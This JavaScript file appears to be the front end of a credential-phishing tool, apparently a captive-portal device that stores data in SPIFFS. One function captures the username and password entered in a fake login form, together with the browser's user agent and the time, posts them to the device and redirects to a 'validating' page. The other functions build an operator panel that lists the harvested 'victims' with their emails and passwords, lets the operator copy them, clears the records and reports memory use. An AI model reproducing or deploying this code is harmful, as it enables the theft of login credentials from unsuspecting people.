function copiarTexto(texto) {
    const textarea = document.createElement("textarea");
    textarea.value = texto;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
}

function bizonhosAddHtml(user, pass, agent, time){
    let newBizonho = document.createElement("li");
    let infoNewBizonho = document.createElement("div");
    let button = document.createElement("button");

    newBizonho.classList.add("item-lista-victim");

    infoNewBizonho.innerHTML = `<p>Email: <strong>${user}</strong> </p>
                                <p>Password: <strong>${pass}</strong> </p>
                                <p>UserAgent: <strong>${agent}</strong> </p>
                                <p>Date Time: <strong>${time}</strong> </p>`;
    
    button.innerText = "copy";
    button.classList.add("copy-button");
    
    button.onclick = () => {
        let text = infoNewBizonho.innerText
        copiarTexto(text)
        button.innerText = "copied!"
    };

    newBizonho.appendChild(infoNewBizonho);
    newBizonho.appendChild(button);


    document.getElementById("bizonhos").appendChild(newBizonho);
}

function getBizonhos(){
    fetch("/victimsjson")
    .then(response => response.json())
    .then(data => {
        console.log(data);
        document.getElementById("qnt-victims").innerText = data.victims.length;
        
        for (let i = 0; i < data.victims.length; i++) {
            const bizonhos = data.victims[i];
            bizonhosAddHtml(bizonhos.username, bizonhos.password, bizonhos.useragent, bizonhos.datetime);
        }
    })
    .catch(error => console.error("Impossivel obter bizonhos!", error));
}
 

function postBizonhos(){
    let user = document.getElementById("username").value;
    let pass = document.getElementById("password").value;
    let userAgent = navigator.userAgent;
    let dateTime = new Date().toLocaleString();

    let jsonData = {
        username: user,
        password: pass, 
        useragent: userAgent,
        datetime: dateTime
    }

    fetch("/post", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(jsonData)
    })
    .then(data => {
        console.log(data);
        window.location.href = "/validando"
    })

}


function deleteAllVictims(){
    if(window.confirm("Você realmente deseja apagar todos os registros? ")){
        fetch("/clear")
        .then(data => {
            window.location.reload()
        })
        .catch(error => { console.error(error); })
    }
}


function getMemory(){
    let total = document.getElementById("total");
    let usado = document.getElementById("usado");
    let livre = document.getElementById("livre");
    let meter = document.getElementById("spiffs-usage");

    fetch("/memory")
    .then(response => response.json())
    .then(data => {
        console.log(data);
        total.innerText = data.total;
        usado.innerText = data.usado;
        livre.innerText = data.livre;

        meter.setAttribute('value', data.usado);
        meter.setAttribute('max', data.total);
    })
    .catch(error => console.error("Impossivel obter dados da memoria!", error));
}